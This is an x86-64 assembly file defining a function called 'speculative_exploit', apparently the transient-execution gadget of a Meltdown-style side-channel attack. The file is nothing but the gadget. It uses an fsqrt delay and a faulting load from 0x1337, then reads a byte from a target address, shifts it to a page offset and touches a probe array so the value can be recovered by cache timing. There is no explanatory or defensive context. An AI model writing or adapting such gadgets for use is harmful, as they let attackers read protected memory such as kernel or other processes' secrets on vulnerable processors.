.intel_syntax noprefix
.global speculative_exploit

speculative_exploit:
    xor rcx, rcx
    mov rbx, rsi
    mov rax, 0x1337
    push rax
    fild qword ptr [rsp]
    fsqrt
    fistp qword ptr [rsp]
    pop rax
    mov rax, [rax]
    mov cl, byte ptr [rdi]
    shl rcx, 12
    add rbx, rcx
    mov rbx, [rbx]
    ret

.section .note.GNU-stack,"",@progbits

